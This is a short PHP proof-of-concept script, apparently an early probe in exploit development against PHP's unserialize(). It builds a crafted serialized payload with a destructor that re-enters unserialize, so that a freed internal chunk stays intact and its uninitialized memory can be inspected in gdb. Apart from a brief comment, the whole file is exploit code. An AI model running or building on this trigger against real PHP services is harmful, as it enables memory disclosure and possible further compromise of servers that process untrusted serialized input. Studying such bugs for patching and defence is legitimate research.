<?php
/* L1-a probe: no spray. The destructor re-enters unserialize('R:1;') so the
 * freed extension chunk is untouched; gdb dumps it while the nested parse is
 * live, exposing the uninitialized data[1..1017] tail.
 */
class T {
    public function __destruct() {
        @unserialize('R:1;');
    }
}
$N = 1016;
$p = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) { $p .= 'i:0;N;'; }
$p .= 'i:99999;O:1:"T":0:{}i:99999;i:42;}';
@unserialize($p);
